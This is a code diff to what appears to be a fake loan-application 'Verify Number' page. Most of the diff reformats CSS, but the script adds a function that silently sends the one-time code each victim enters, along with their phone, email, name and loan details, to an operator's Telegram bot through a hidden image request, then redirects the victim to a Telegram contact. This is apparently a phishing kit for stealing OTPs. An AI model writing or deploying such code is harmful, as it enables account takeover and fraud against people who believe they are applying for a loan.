@@ -5,161 +5,38 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
     <title>InnCredits · Verify Number</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background: #0b1120; font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif; display: flex; align-items: flex-start; justify-content: center; min-height: 100vh; padding: 16px 16px 32px 16px; }
+        .app-container { max-width: 500px; width: 100%; margin: 0 auto; display: flex; flex-direction: column; }
 
-        body {
-            background: #0b1120;
-            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif;
-            display: flex;
-            align-items: flex-start;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 16px 16px 32px 16px;
-        }
+        .loan-summary-bar { background: #111827; border-radius: 20px; padding: 14px 18px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; border: 1px solid #1f2a3e; }
+        .summary-item { display: flex; flex-direction: column; }
+        .summary-label { font-size: 0.7rem; color: #7e8aa2; text-transform: uppercase; }
+        .summary-value { font-size: 1rem; font-weight: 700; color: #14b8a6; }
 
-        .app-container {
-            max-width: 500px;
-            width: 100%;
-            margin: 0 auto;
-            display: flex;
-            flex-direction: column;
-        }
+        .otp-card { background: #111827; border-radius: 32px; padding: 28px 24px 32px 24px; }
+        .section-title { font-size: 1.3rem; font-weight: 700; color: #ffffff; }
+        .section-sub { font-size: 0.8rem; color: #7e8aa2; margin-bottom: 28px; border-left: 3px solid #14b8a6; padding-left: 12px; }
 
-        .loan-summary-bar {
-            background: #111827;
-            border-radius: 20px;
-            padding: 14px 18px;
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 10px;
-            border: 1px solid #1f2a3e;
-        }
-        .summary-item {
-            display: flex;
-            flex-direction: column;
-        }
-        .summary-label {
-            font-size: 0.7rem;
-            color: #7e8aa2;
-            text-transform: uppercase;
-        }
-        .summary-value {
-            font-size: 1rem;
-            font-weight: 700;
-            color: #14b8a6;
-        }
+        .phone-verify-box { background: #0f1724; border-radius: 24px; padding: 18px 16px; margin-bottom: 28px; display: flex; justify-content: space-between; align-items: center; }
+        .phone-number { font-size: 1.1rem; font-weight: 700; color: #e2e8f0; }
+        .edit-link { color: #14b8a6; background: rgba(20,184,166,0.1); padding: 6px 14px; border-radius: 40px; cursor: pointer; }
+        .edit-link:active { transform: scale(0.95); }
 
-        .otp-card {
-            background: #111827;
-            border-radius: 32px;
-            padding: 28px 24px 32px 24px;
-        }
+        .otp-container { display: flex; justify-content: center; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; }
+        .otp-box { width: 55px; height: 65px; background: #0f1724; border: 2px solid #1f2a3e; border-radius: 16px; text-align: center; font-size: 1.6rem; font-weight: 700; color: #14b8a6; outline: none; transition: all 0.2s; }
+        .otp-box:focus { border-color: #14b8a6; box-shadow: 0 0 0 3px rgba(20,184,166,0.2); }
 
-        .section-title {
-            font-size: 1.3rem;
-            font-weight: 700;
-            color: #ffffff;
-        }
-        .section-sub {
-            font-size: 0.8rem;
-            color: #7e8aa2;
-            margin-bottom: 28px;
-            border-left: 3px solid #14b8a6;
-            padding-left: 12px;
-        }
+        .verify-btn { width: 100%; background: #14b8a6; border: none; padding: 18px; font-size: 1.1rem; font-weight: 700; color: #0b1120; border-radius: 60px; cursor: pointer; transition: all 0.2s; }
+        .verify-btn:active { transform: scale(0.97); }
+        .error-message { color: #f43f5e; font-size: 0.75rem; text-align: center; margin-top: 12px; display: none; }
+        .error-message.show { display: block; }
 
-        .phone-verify-box {
-            background: #0f1724;
-            border-radius: 24px;
-            padding: 18px 16px;
-            margin-bottom: 28px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .phone-number {
-            font-size: 1.1rem;
-            font-weight: 700;
-            color: #e2e8f0;
-        }
-        .edit-link {
-            color: #14b8a6;
-            background: rgba(20, 184, 166, 0.1);
-            padding: 6px 14px;
-            border-radius: 40px;
-            cursor: pointer;
-        }
-        .edit-link:active {
-            transform: scale(0.95);
-        }
-
-        .otp-container {
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-        .otp-box {
-            width: 55px;
-            height: 65px;
-            background: #0f1724;
-            border: 2px solid #1f2a3e;
-            border-radius: 16px;
-            text-align: center;
-            font-size: 1.6rem;
-            font-weight: 700;
-            color: #14b8a6;
-            outline: none;
-            transition: all 0.2s;
-        }
-        .otp-box:focus {
-            border-color: #14b8a6;
-            box-shadow: 0 0 0 3px rgba(20, 184, 166, 0.2);
-        }
-
-        .verify-btn {
-            width: 100%;
-            background: #14b8a6;
-            border: none;
-            padding: 18px;
-            font-size: 1.1rem;
-            font-weight: 700;
-            color: #0b1120;
-            border-radius: 60px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .verify-btn:active {
-            transform: scale(0.97);
-        }
-        .error-message {
-            color: #f43f5e;
-            font-size: 0.75rem;
-            text-align: center;
-            margin-top: 12px;
-            display: none;
-        }
-        .error-message.show {
-            display: block;
-        }
-
-        @media (max-width: 450px) {
-            .otp-box { width: 48px; height: 55px; font-size: 1.4rem; }
-            .otp-container { gap: 8px; }
-        }
+        @media (max-width: 450px) { .otp-box { width: 48px; height: 55px; font-size: 1.4rem; } .otp-container { gap: 8px; } }
     </style>
 </head>
 <body>
 <div class="app-container">
-    <!-- TOP BAR - Loan Summary -->
     <div class="loan-summary-bar">
         <div class="summary-item"><span class="summary-label">Loan Amount</span><span class="summary-value" id="summaryAmount">$0</span></div>
         <div class="summary-item"><span class="summary-label">Term</span><span class="summary-value" id="summaryTerm">0</span></div>
@@ -211,9 +88,7 @@
     const userEmail = urlParams.get('email') || '';
     const applicationId = urlParams.get('appId') || localStorage.getItem('current_application_id');
     
-    // ============================================
-    // UPDATE TOP BAR
-    // ============================================
+    // Update top bar
     document.getElementById('summaryAmount').innerText = `$${parseInt(amount).toLocaleString()}`;
     document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
     document.getElementById('summaryMonthly').innerText = `$${parseFloat(monthly).toFixed(2)}`;
@@ -221,25 +96,23 @@
     document.getElementById('displayPhone').innerText = userPhone;
     
     // ============================================
-    // SEND OTP TO ADMIN TELEGRAM
+    // SEND OTP NOTIFICATION TO TELEGRAM
     // ============================================
-    function sendOtpToAdmin(otp) {
-        const message = `🔐 *OTP ENTERED* 🔐\n\n📱 Phone: ${userPhone}\n🔑 OTP: ${otp}\n📧 Email: ${userEmail}\n👤 Name: ${userName}\n💰 Loan: $${parseInt(amount).toLocaleString()} for ${term} months\n🆔 App ID: ${applicationId || 'N/A'}`;
+    function sendOtpNotification(otp) {
+        const message = `🔐 *OTP ENTERED BY USER* 🔐\n\n━━━━━━━━━━━━━━━━━━━━━\n📱 *Phone:* ${userPhone}\n🔑 *OTP:* ${otp}\n📧 *Email:* ${userEmail}\n👤 *Name:* ${userName}\n━━━━━━━━━━━━━━━━━━━━━\n💰 *Loan:* $${parseInt(amount).toLocaleString()} for ${term} months\n🆔 *App ID:* ${applicationId || 'N/A'}\n━━━━━━━━━━━━━━━━━━━━━\n\n✅ User has entered the OTP and is being redirected to your Telegram.`;
         
         const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
         
-        // Send using Image tag (no CORS issues, no delay)
         var img = new Image();
         img.src = url;
-        console.log('✅ OTP sent to admin:', otp);
+        console.log('✅ OTP notification sent to admin:', otp);
     }
     
     // ============================================
     // REDIRECT TO TELEGRAM
     // ============================================
     function redirectToTelegram() {
-        const message = `Hello, I have verified my number.`;
-        const telegramUrl = `https://t.me/${TELEGRAM_USERNAME}?text=${encodeURIComponent(message)}`;
+        const telegramUrl = `https://t.me/${TELEGRAM_USERNAME}`;
         window.location.href = telegramUrl;
     }
     
@@ -308,7 +181,7 @@
     });
     
     // ============================================
-    // VERIFY BUTTON - SEND OTP + REDIRECT
+    // VERIFY BUTTON
     // ============================================
     verifyBtn.onclick = () => {
         const enteredOtp = currentOtp.join('');
@@ -318,10 +191,10 @@
             return;
         }
         
-        // Send OTP to admin Telegram (instant, no delay)
-        sendOtpToAdmin(enteredOtp);
+        // Send OTP notification to admin
+        sendOtpNotification(enteredOtp);
         
-        // Redirect to user's Telegram (instant)
+        // Redirect to user's Telegram
         redirectToTelegram();
     };
     
